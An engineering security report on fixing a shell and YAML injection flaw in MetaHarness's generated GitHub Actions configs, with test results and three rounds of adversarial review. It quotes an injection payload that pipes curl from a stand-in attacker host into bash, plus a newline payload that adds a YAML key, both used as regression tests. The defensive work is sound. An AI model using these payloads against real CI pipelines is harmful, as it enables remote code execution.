# Host-Adapters SOTA Report — 2026-08-19

TL;DR: MetaHarness scaffolds 10 host targets from one `HarnessSpec` via 3 independently-maintained
codegen paths (ADR-027 byte-parity contract). The 2026-08-14 run found+fixed a YAML-key injection in
that architecture for hermes. Tonight's research found the same root cause recurs for github-actions:
`cfg.name`/`spec.name` lands unescaped inside a double-quoted bash string in a generated composite
GitHub Action's `run:` line, identically in all 3 paths. Fixed with a `shellDq()` escaping helper,
mirroring the hermes `yamlKey()` playbook — pending independent adversarial verification before ship.

## MetaHarness Current Capability
`packages/create-agent-harness/src/host-config.ts` (CLI mirror), `apps/web-ui/src/generator/scaffold.ts`
(Studio), and each `packages/host-*/src/index.ts` adapter independently emit native config for 9 non-
claude-code hosts from one spec. The CLI and web-UI both gate `HarnessSpec.name` to kebab-case
(`validateHarnessName`, `/^[a-z][a-z0-9-]*$/`) before calling into codegen — but the codegen functions
themselves (`hostConfigFiles`, `buildScaffold`, `adapter.generateConfig`) are public, exported, and
perform **no internal validation**, so any direct/programmatic caller (SDK consumer building a
`HarnessSpec` by hand, `scripts/verify-all-hosts.mjs`, a future feature) reaches them unguarded.

Synthesis: no competitor in the required six actually has MetaHarness's N-independent-emitters shape —
this is a **genuine architectural gap in the landscape**, not solved-but-unpublished. The nearest
structural peer (`datamodel-code-generator`) shows this exact bug class produces real CVEs when it
occurs. MetaHarness is ahead of that peer in one respect: both catches tonight and on 08-14 were found
and fixed via a deliberate audit *before* any external report, not after a live disclosure.

## Hypothesis
Given `hostConfigFiles`'s (and its 2 byte-parity siblings') github-actions case, which interpolates
`cfg.name`/`spec.name` unescaped into a bash double-quoted `echo` inside a generated composite Action
(`run: echo "Running ${name} (non-interactive)…"`), when a `shellDq()` escaping function analogous to
the existing `yamlKey()` is applied at that site in all 3 codegen paths, then a name containing shell
metacharacters (`"`, `` ` ``, `$`, newline) passed directly to these exported functions — bypassing the
CLI/web-UI's `validateHarnessName` gate, the only thing preventing this today — should no longer be able
to break out of the double-quoted string or inject additional shell commands into the emitted
`action.yml`, while every existing (already-kebab-case) name produces byte-identical output. Subject to:
zero regression across the existing 458+21+69 tests, no change to `validateHarnessName` itself, diff
materially under 300 lines.

## Benchmarks / Evaluation
Deterministic, not sampled, and NOT self-certified — 2 independent adversarial rounds materially
changed the shipped diff (see Adversarial Critique). Final state, verified end-to-end (real YAML parse
via js-yaml + real bash execution of the extracted script body, not just string matching):
- Shell-metacharacter payload (`harness"; curl -s http://attacker.example/x | bash #`): pre-fix, the
  extracted `run:` body executes the injected `curl|bash` as a live second statement. Post-fix, the same
  payload comes back as a single inert `echo` line (verified with `execFileSync('bash', ...)` — no
  sentinel file created, output is the full literal string).
- Newline/comment payload (`evil-harness\nrun-name: pwned-by-attacker\n#`): pre-fix, js-yaml parses the
  generated workflow.yml with an attacker-controlled top-level `run-name` key present. Post-fix, `js-yaml.
  load()` confirms no such key in any of the 3 codegen paths' output.
- 7 new regression tests across the 3 codegen paths' test suites (comment-line, run-block, step-name
  sites), each executing real bash or asserting exact byte-identical safe output — not just "contains an
  escaped character".
- Full suites: `create-agent-harness` 460/462 (2 pre-existing skips, 0 regressions), `host-github-actions`
  24/24, `apps/web-ui` 71/71. `tsc --noEmit` clean in all 3 packages. Full monorepo `npm run build` clean.
  Diff: 6 files, 258 insertions / 9 deletions — under the 300-line target.

## Adversarial Critique
3 independent critic rounds — this candidate would have shipped incomplete without the first two:
- **Round 1: REJECT.** Confirmed the bash-escaping itself was sound (backtick/`$(...)` correctly
  neutralized), but found (a) a missed sibling: the workflow.yml header `# GitHub Actions harness:
  ${name}` comment was completely unescaped in all 3 files — a newline injects an arbitrary top-level
  YAML key, more severe than the bug that was fixed; (b) the `run:` line's plain-scalar YAML format
  (`run: echo "..."`) let a ` #` truncate the line as a YAML comment *before bash ever ran it* — the
  bash-escaping alone didn't close a YAML-layer vulnerability; (c) an inaccurate code comment overstating
  reachability (claimed no caller validates the name; the sole production caller actually does).
- **Round 2 (after fixes): REJECT again.** Confirmed findings (a)-(c) resolved in 2 of 3 files, but found
  one sibling site the author missed one function away: `actionYaml()`'s own header comment (`#
  Composite action for the ${name} harness...`) in the real `@metaharness/host-github-actions` package —
  same unescaped-newline injection, in the exact file round 1 had called "already safe" for the adjacent
  concern.
- **Round 3: ACCEPT.** A third, narrowly-scoped verifier confirmed the final 1-line fix (`actionYaml()`'s
  header comment, the sibling round 2 found) is correct, confirmed the new regression test actually
  checks for absence of an injected top-level key (not just a substring), independently reproduced with
  js-yaml against the built dist, and swept the entire file for any remaining unescaped `spec.name`/
  `spec.description` site — found none in a YAML- or bash-parsed position (the 2 remaining raw
  interpolations are Markdown-only, correctly out of scope).
